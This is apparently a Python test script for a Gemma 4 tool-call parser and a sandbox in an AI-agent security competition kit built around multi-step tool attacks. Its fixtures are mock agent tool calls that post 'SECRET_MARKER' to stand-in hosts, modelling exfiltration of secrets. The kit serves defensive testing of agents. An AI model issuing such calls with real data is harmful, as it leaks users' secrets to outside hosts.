from __future__ import annotations

import sys
from pathlib import Path
from typing import Any, Sequence


ROOT = Path(__file__).resolve().parents[2]
PACKAGE_ROOT = ROOT / "ai-agent-security-multi-step-tool-attacks"
sys.path.insert(0, str(PACKAGE_ROOT))

from aicomp_sdk.agents.hf_chat_template.types import HFGenerationResponse
from aicomp_sdk.agents.types import (
    AgentStateSnapshot,
    AgentToolSpec,
    InvalidModelOutputError,
)
from aicomp_sdk.core.env.sandbox import SandboxEnv
from aicomp_sdk.core.runtime_history import RuntimeHistory
from kaggle_evaluation.jed_attack_134815.gemma_model_server import (
    KaggleGemma4ToolCallParser,
)


def _response(raw_text: str) -> HFGenerationResponse:
    return HFGenerationResponse(text=raw_text, raw_text=raw_text)


class AlwaysInvalidAgent:
    def next_action(
        self,
        *,
        history: RuntimeHistory,
        tools: Sequence[AgentToolSpec],
    ) -> Any:
        del history, tools
        raise InvalidModelOutputError("Model returned multiple tool calls")

    def reset_state(self) -> None:
        return None

    def snapshot_state(self) -> AgentStateSnapshot:
        return {"version": 1, "backend": "test", "data": {}}

    def restore_state(self, snapshot: AgentStateSnapshot) -> None:
        del snapshot


def main() -> None:
    parser = KaggleGemma4ToolCallParser()
    strict_bare_keys = (
        '<|tool_call>call:http.post{url:"://a",'
        'data:"SECRET_MARKER"}<tool_call|>'
    )
    single_brace_json = (
        '<|tool_call>call:http.post{"url":"://a",'
        '"data":"SECRET_MARKER"}<tool_call|>'
    )
    double_brace_json = (
        '<|tool_call>call:http.post{{"url":"http://a.co",'
        '"data":"SECRET_MARKER"}}<tool_call|>'
    )
    call_b = (
        '<|tool_call>call:http.post{{"url":"http://b.co",'
        '"data":"SECRET_MARKER"}}<tool_call|>'
    )

    strict = parser.parse(_response(strict_bare_keys), fallback_call_id="strict")
    assert strict.call.tool_name == "http.post"
    assert dict(strict.call.arguments) == {
        "url": "://a",
        "data": "SECRET_MARKER",
    }

    single_json_error = ""
    try:
        parser.parse(_response(single_brace_json), fallback_call_id="single-json")
    except InvalidModelOutputError as error:
        single_json_error = str(error)
    assert single_json_error == "Invalid Gemma 4 tool-call arguments"

    double_json = parser.parse(
        _response(double_brace_json),
        fallback_call_id="double-json",
    )
    assert double_json.call.tool_name == "http.post"
    assert dict(double_json.call.arguments) == {
        "url": "http://a.co",
        "data": "SECRET_MARKER",
    }

    multiple_error = ""
    try:
        parser.parse(
            _response(double_brace_json + call_b),
            fallback_call_id="call-2",
        )
    except InvalidModelOutputError as error:
        multiple_error = str(error)
    assert multiple_error == "Model returned multiple tool calls"

    env = SandboxEnv(
        seed=123,
        fixtures_dir=PACKAGE_ROOT / "aicomp_sdk" / "fixtures",
        agent=AlwaysInvalidAgent(),
        max_tool_hops=8,
    )
    result = env.interact("trigger", max_tool_hops=8)
    trace = env.export_trace_dict()
    assert result.agent_refused is True
    assert trace["tool_events"] == []
    assert trace["assistant_messages"] == ["(no_tool)"]

    print("strict_bare_keys=accepted")
    print(f"single_brace_json={single_json_error}")
    print("double_brace_json=accepted")
    print(f"multiple_tool_calls={multiple_error}")
    print(f"sandbox_agent_refused={result.agent_refused}")
    print(f"sandbox_tool_events={len(trace['tool_events'])}")
    print(f"sandbox_assistant_messages={trace['assistant_messages']}")


if __name__ == "__main__":
    main()
